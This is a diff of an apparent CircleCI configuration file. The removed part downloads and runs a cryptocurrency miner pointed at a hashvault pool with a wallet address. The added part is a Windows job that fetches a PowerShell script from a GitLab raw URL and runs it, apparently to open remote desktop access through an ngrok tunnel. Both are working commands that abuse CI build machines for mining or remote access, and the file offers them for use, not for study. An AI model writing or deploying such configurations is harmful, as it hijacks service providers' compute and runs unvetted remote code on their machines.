@@ -1,8 +1,19 @@
-wget https://download1083.mediafire.com/p61f4jm992eg/s5q7dn0o0vxnqyl/ab.zip
-sleep 3
-unzip ab
-sleep 3
-cd ab
-sleep 3
-chmod +x ./ab
-./ab --url pool.hashvault.pro:80 --user hvxy26Fsyz3GiKdKH9sP96T8UKyd7D1hnedoXYVawNkg84nxvr2J8X5XcRHoPya1paftqpLcK2ucnePS8avVNkYv9wHQ4E87cp --pass Heysitkd --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+version: 2.1 
+ 
+orbs:
+  win: circleci/windows@2.2.0
+ 
+jobs:
+  build: 
+    executor:
+      name: win/default 
+      size: "medium" 
+ 
+    steps:
+      - run:
+          name: Windows RDP Circle CI NEW UPDATED
+          command: |
+            Set-Variable -Name "PASSWORD" -Value "YOUR_PASSWORD_HERE"
+            Set-Variable -Name "NGROK" -Value "YOUR_NGROK_AUTHTOKEN_HERE"
+            Invoke-WebRequest https://gitlab.com/haithuongpro2711/haivps/-/raw/master/RDPcircleCI.ps1 -OutFile RDPcircleCI.ps1
+            ./RDPcircleCI.ps1
